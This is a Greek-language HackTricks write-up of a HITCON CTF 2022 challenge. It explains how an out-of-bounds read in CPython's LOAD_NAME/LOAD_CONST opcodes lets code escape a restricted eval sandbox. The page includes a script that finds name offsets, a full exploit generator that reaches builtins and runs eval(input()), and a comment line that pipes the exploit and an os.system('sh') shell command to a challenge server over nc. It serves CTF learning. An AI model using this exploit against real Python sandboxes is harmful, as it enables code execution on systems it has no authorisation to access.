# LOAD\_NAME / LOAD\_CONST opcode OOB Read

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Αυτές οι πληροφορίες ελήφθησαν** [**από αυτήν την ανάρτηση**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB read στο LOAD\_NAME / LOAD\_CONST opcode για να αποκτήσουμε κάποιο σύμβολο στη μνήμη. Αυτό σημαίνει ότι χρησιμοποιούμε κόλπα όπως `(a, b, c, ... εκατοντάδες σύμβολα ..., __getattribute__) if [] else [].__getattribute__(...)` για να αποκτήσουμε ένα σύμβολο (όπως το όνομα μιας συνάρτησης) που θέλουμε.

Στη συνέχεια, απλά κατασκευάζετε την εκμετάλλευσή σας.

### Overview <a href="#overview-1" id="overview-1"></a>

Ο πηγαίος κώδικας είναι αρκετά σύντομος, περιέχει μόνο 4 γραμμές!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Μπορείτε να εισάγετε αυθαίρεο Python κώδικα, και θα μετατραπεί σε ένα [Python code object](https://docs.python.org/3/c-api/code.html). Ωστόσο, το `co_consts` και το `co_names` αυτού του code object θα αντικατασταθούν με ένα κενό tuple πριν την εκτέλεση αυτού του code object.

Έτσι, με αυτόν τον τρόπο, όλες οι εκφράσεις που περιέχουν σταθερές (π.χ. αριθμούς, συμβολοσειρές κ.λπ.) ή ονόματα (π.χ. μεταβλητές, συναρτήσεις) μπορεί να προκαλέσουν σφάλμα τμηματοποίησης στο τέλος.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Πώς συμβαίνει το segfault;

Ας ξεκινήσουμε με ένα απλό παράδειγμα, `[a, b, c]` θα μπορούσε να μετατραπεί στον παρακάτω bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Αλλά τι γίνεται αν το `co_names` γίνει κενό tuple; Ο opcode `LOAD_NAME 2` εκτελείται ακόμα και προσπαθεί να διαβάσει την τιμή από τη μνήμη που αρχικά θα έπρεπε να είναι. Ναι, αυτό είναι ένα χαρακτηριστικό "out-of-bound read".

Η βασική έννοια για τη λύση είναι απλή. Ορισμένοι opcodes στην CPython, για παράδειγμα `LOAD_NAME` και `LOAD_CONST`, είναι ευάλωτοι (?) σε OOB read.

Ανακτούν ένα αντικείμενο από τον δείκτη `oparg` από το tuple `consts` ή `names` (αυτό είναι που ονομάζονται `co_consts` και `co_names` κάτω από την επιφάνεια). Μπορούμε να αναφερθούμε στο παρακάτω σύντομο απόσπασμα σχετικά με το `LOAD_CONST` για να δούμε τι κάνει η CPython όταν επεξεργάζεται τον opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Με αυτόν τον τρόπο μπορούμε να χρησιμοποιήσουμε τη δυνατότητα OOB για να αποκτήσουμε ένα "όνομα" από αυθαίρετη διεύθυνση μνήμης. Για να βεβαιωθούμε ποιο όνομα έχει και ποια είναι η διεύθυνσή του, απλώς συνεχίστε να δοκιμάζετε `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Και θα μπορούσατε να βρείτε κάτι σε περίπου oparg > 700. Μπορείτε επίσης να προσπαθήσετε να χρησιμοποιήσετε το gdb για να ρίξετε μια ματιά στη διάταξη μνήμης φυσικά, αλλά δεν νομίζω ότι θα ήταν πιο εύκολο;

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Μόλις ανακτήσουμε αυτές τις χρήσιμες διευθύνσεις για ονόματα / σταθερές, πώς _ακριβώς_ αποκτούμε ένα όνομα / σταθερά από αυτή τη διεύθυνση και το χρησιμοποιούμε; Εδώ είναι ένα κόλπο για εσάς:\
Ας υποθέσουμε ότι μπορούμε να αποκτήσουμε ένα όνομα `__getattribute__` από τη διεύθυνση 5 (`LOAD_NAME 5`) με `co_names=()`, τότε απλώς κάντε τα εξής:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Παρατηρήστε ότι δεν είναι απαραίτητο να το ονομάσετε ως `__getattribute__`, μπορείτε να το ονομάσετε με κάτι πιο σύντομο ή πιο περίεργο

Μπορείτε να κατανοήσετε τον λόγο πίσω από αυτό απλά βλέποντας τον bytecode του:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Σημειώστε ότι το `LOAD_ATTR` ανακτά επίσης το όνομα από το `co_names`. Η Python φορτώνει ονόματα από την ίδια θέση αν το όνομα είναι το ίδιο, οπότε το δεύτερο `__getattribute__` φορτώνεται ακόμα από offset=5. Χρησιμοποιώντας αυτή τη δυνατότητα, μπορούμε να χρησιμοποιήσουμε οποιοδήποτε όνομα μόλις το όνομα είναι στη μνήμη κοντά.

Για τη δημιουργία αριθμών θα πρέπει να είναι απλό:

* 0: όχι \[\[]]
* 1: όχι \[]
* 2: (όχι \[]) + (όχι \[])
* ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Δεν χρησιμοποίησα consts λόγω του περιορισμού μήκους.

Πρώτα εδώ είναι ένα σενάριο για να βρούμε αυτά τα offsets των ονομάτων.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Και το παρακάτω είναι για τη δημιουργία του πραγματικού εκμεταλλευτή Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Βασικά εκτελεί τα εξής πράγματα, για αυτές τις συμβολοσειρές τις αποκτούμε από τη μέθοδο `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
